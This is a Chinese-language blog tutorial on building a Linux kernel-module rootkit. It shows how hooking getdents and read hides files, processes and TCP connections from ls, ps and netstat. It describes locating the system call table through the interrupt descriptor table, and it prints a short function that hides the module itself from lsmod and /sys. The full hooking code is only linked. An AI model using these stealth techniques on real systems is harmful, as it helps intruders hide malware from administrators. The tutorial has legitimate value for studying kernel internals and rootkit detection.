title: 通过内核模块实现隐藏信息的 Rootkit
date: 2016-08-06 10:35:00
tags:
- 安全
- Rootkit
categories:
- Develop
---

### 1. Rootkit 简介

Rootkit 是一个软件或者一个以上的软件集合，目的是隐藏其他进程的软件，与木马或者病毒不同，Rootkit 一般会与木马或者病毒配合使用，而不是单独使用。Rootkit 一词的由 root 和 kit 两个词组成，前者表示它一般以一个高权限来执行（对于 *nix 系统就是 root），而 kit 表示它作为一个工具集，不是被单独使用的。

在这篇文章里我们完成的 Rootkit 的主要功能是隐藏 `ls` 显示出的文件信息、`netstat` 显示出的网络信息、`ps` 显示出的进程信息以及 Rootkit 模块本身。

<!-- more -->

### 2. 可装载内核模块

操作系统提供面向开发者提供了 LKM（Loadable kernel modules） 用于拓展操作系统的机能，LKM 可用于支持新的硬件或者文件系统，或者增加系统调用，一般对于 Linux 系统我们直接将其称为内核模块。在这篇文章中，我们通过在内核模块中 hook 系统调用的方式，来隐藏指定的信息。

### 3. Hook 哪些系统调用

在开始编写内核模块之前，需要先找到对于不同情况需要 hook 哪些系统调用，这里可以使用 `strace` 来跟踪系统调用和信号。

#### 3.1. ls

`ls` 在 Linux 系统中用于列出当前或者指定目录下的文件和目录，可以通过 `strace -o debug.out ls` 来捕获 ls 命令所调用的系统调用，这里只截取了重要的部分。

对于内核版本为 `4.6.4-1` 的  x86_64 的 ArchLinux：

```c
...
getdents(3, /* 140 entries */, 32768)   = 4736
getdents(3, /* 0 entries */, 32768)     = 0
...
```

对于内核版本为 `3.13.0-36-generic` 的 i686 的 Ubuntu 14.04 LTS：

```c
...
getdents64(3, /* 10 entries */, 32768)  = 304
getdents64(3, /* 0 entries */, 32768)   = 0
...
```

`ls` 通过 `getdents` 或者 `getdents64` 获取当前或者指定文件夹的文件或者目录的入口点，处理之后输出给用户。

`getdents` 和 `getdents64` 这两个函数都是获取文件或者目录入口点的，返回值是读取到的 `linux_dirent`（对于 `getdents`，下同） 或者 `linux_dirent64`（对于 `linux_dirent64`，下同） 指针数据的长度，首个 `linux_dirent` 或者 `linux_dirent64` 是通过调用时的一个类型为 `linux_dirent`、`linux_dirent64`指针参数获得。`getdents` 和 `getdents64` 两者的差别在于后者拥有更大的 `d_ino` 和 `d_off` 范围支持，而且支持一个文件类型参数。更多信息可以通过[手册](http://man7.org/linux/man-pages/man2/getdents.2.html)来获取。

为了从 `ls` 操作中隐藏我们需要的文件名，可以通过对 `getdents` 或者 `getdents64` 的返回值进行修改，如果返回的数据中存在指定的文件名的话，那么把这个节点移除，再返回给调用者。 

#### 3.2. ps

`ps` 在 Linux 系统中用于获取当前的进程信息，可以通过 `strace -o debug.out ps` 来捕获 `ps` 命令所调用的系统调用，这里同样只截取了重要的部分。

对于内核版本为 `4.6.4-1` 的  x86_64 的 ArchLinux：

```c
...
getdents(5, /* 261 entries */, 32768)   = 6640 
stat("/proc/1", {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
open("/proc/1/stat", O_RDONLY)          = 6  
read(6, "1 (systemd) S 0 1 1 0 -1 4194560"..., 1024) = 184
close(6)                                = 0  
open("/proc/1/status", O_RDONLY)        = 6  
read(6, "Name:\tsystemd\nState:\tS (sleeping"..., 1024) = 945
close(6)                                = 0  
stat("/proc/2", {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
open("/proc/2/stat", O_RDONLY)          = 6  
read(6, "2 (kthreadd) S 0 0 0 0 -1 212998"..., 1024) = 149
close(6)                                = 0  
...
```

对于内核版本为 `3.13.0-36-generic` 的 i686 的 Ubuntu 14.04 LTS：

```c
...
getdents(5, /* 132 entries */, 32768)   = 2372
stat64("/proc/1", {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
open("/proc/1/stat", O_RDONLY)          = 6
read(6, "1 (init) S 0 1 1 0 -1 4219136 20"..., 1024) = 172
close(6)                                = 0
open("/proc/1/status", O_RDONLY)        = 6
read(6, "Name:\tinit\nState:\tS (sleeping)\nT"..., 1024) = 750
close(6)                                = 0
stat64("/proc/2", {st_mode=S_IFDIR|0555, st_size=0, ...}) = 0
open("/proc/2/stat", O_RDONLY)          = 6
read(6, "2 (kthreadd) S 0 0 0 0 -1 213817"..., 1024) = 148
close(6)                                = 0
...
```

`ps` 通过使用 `getdents` 获取 `/proc` 文件夹下以进程 PID 为名的文件夹里的用来表示进程状态的各个文件，使用 `read` 读取其内容后进一步处理，展现给用户。

`/proc` 文件夹是一个伪文件系统，用于通过内核访问进程信息，可以理解为进程信息的映射，对于 `/proc` 文件夹内各文件表示的内容，可以参考 [/proc - The Linux Documentation Project](http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html)，不再赘述。

为了从 `ps` 中隐藏进程，同样可以通过对 `getdents` 的返回值进行修改，通过 `getdents` 返回的文件夹名获取到每个进程的 PID 号，再检查该 PID 号对应的进程名与需要隐藏的进程名是否相符，如果相符的话，从返回数据中移除该 PID 号为名的文件夹的节点。

#### 3.3. netstat

`netstat` 在 Linux 系统中用于获取当前的各种网络信息，可以通过 `strace -o debug.out netstat` 来捕获 `netstat` 命令所调用的系统调用，这里同样只截取了重要的部分。

对于内核版本为 `4.6.4-1` 的  x86_64 的 ArchLinux：

```c
...
write(1, "Active Internet connections (w/o"..., 42) = 42
write(1, "Proto Recv-Q Send-Q Local Addres"..., 80) = 80
open("/proc/net/tcp", O_RDONLY)         = 3
read(3, "  sl  local_address rem_address "..., 4096) = 4050
socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 4
connect(4, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
close(4)                                = 0
socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 4
connect(4, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
close(4)                                = 0
...
```

对于内核版本为 `3.13.0-36-generic` 的 i686 的 Ubuntu 14.04 LTS：

```c
...
write(1, "Active Internet connections (w/o"..., 42) = 42
write(1, "Proto Recv-Q Send-Q Local Addres"..., 80) = 80
open("/proc/net/tcp", O_RDONLY)         = 3
read(3, "  sl  local_address rem_address "..., 4096) = 600
socket(PF_LOCAL, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 4
connect(4, {sa_family=AF_LOCAL, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
close(4)                                = 0
socket(PF_LOCAL, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 4
connect(4, {sa_family=AF_LOCAL, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
close(4)                                = 0
...
```

`netstat` 通过读取 `/proc/net/tcp` 等文件的信息，来获取本机上的网络通讯信息，经过处理后展现给用户。

为了从 `netstat` 中隐藏 TCP 连接信息，可以对通过 `read` 的返回值修改来实现，如果 `open` 的文件是 `/proc/net/tcp` 且读取的改行中存在指定的端口号，那么就将该行从 `read` 的返回数据中移除。

### 4. 编写 rootkit

#### 4.1. 编写内核模块

最基础的内核模块的代码主要由模块被启动以及卸载时执行的函数这两个部分组成，可以通过 `module_init`来指定启动时执行的函数，通过 `module_exit` 来指定卸载时执行的内核函数。除此之外，内核模块的代码还可以包含其协议，作者等信息。

以下是一个最简单的内核模块：

```c
#include <linux/module.h>
#include <linux/kernel.h>


int init(void) {
	printk(KERN_INFO "Hello world\n");
	return 0;
}

void exit(void) {
	printk(KERN_INFO "Goodbye world\n");
}

module_init(init);
module_exit(exit);
```

可以通过的 Makefile 来编译，该 Makefile 指定了内核模块编译的目录：

```makefile
obj-m += hello.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

可以通过 `insmod` 载入内核模块，通过 `rmmod` 删除内核模块，可以通过 `dmesg` 来看到启动时输出的 `Hello world` 以及被卸载时输出的 `Goodbye world`。

#### 4.2. Hook 原系统调用

Hook 原系统调用需要找到原系统调用表，尽管没有直接获取系统调用表地址的 API，但可以通过系统调用的汇编指令的特征来做：

```asm
syscall_call:
        call *sys_call_table(,%eax,4)
```

首先通过 `sidt` 寄存器获取中断描述表的基地址，因为进行系统调用的中断是 `INT 0x80`，所以需要再偏移 `8 * 0x80` 找到 `call *sys_call_table(,%eax,4)` 这条汇编语句，找到后就可以提取出系统调用表的地址。

在找到系统调用表之后，通过系统调用号作为偏移找到对应的系统调用的地址，然后就可以进行 Hook 操作。

#### 4.3. 隐藏内核模块本身

可以通过以下的函数隐藏内核模块本身：

```
static inline void rootkit_hide(void) {
    list_del(&THIS_MODULE->list);//lsmod,/proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj);// /sys/modules
    list_del(&THIS_MODULE->mkobj.kobj.entry);// kobj struct list_head entry
}
```

第一条保证了删除 `struct modules` 链表中当前的模块的信息，这样就删除了 `/proc/modules` 中的对应映射，依赖 `/proc/modules` 的 `lsmod` 就无法再显示出本内核模块了，第二条保证删除了当前模块的 KObject 和 kobj 链表上的当前模块的信息，那么 `/sys/modules` 中也无法显示出本内核模块了，更详细的信息可以参考 [Linux Rootkit 系列一：LKM 的基础编写及隐藏](http://www.freebuf.com/articles/system/54263.html)。

### 5. 具体实现

具体实现可以参考 [https://gist.github.com/brickgao/171add4bebae75a1615c91bce46cc0e1](https://gist.github.com/brickgao/171add4bebae75a1615c91bce46cc0e1)。

------

参考资料：

1. https://zh.wikipedia.org/wiki/Procfs
2. https://en.wikipedia.org/wiki/Rootkit
3. https://en.wikipedia.org/wiki/Loadable_kernel_module
4. http://www.cppblog.com/momoxiao/archive/2010/04/04/111594.aspx
5. http://tldp.org/LDP/lkmpg/2.6/html/
6. http://stackoverflow.com/a/5864323/5726964
7. http://www.freebuf.com/articles/system/54263.html
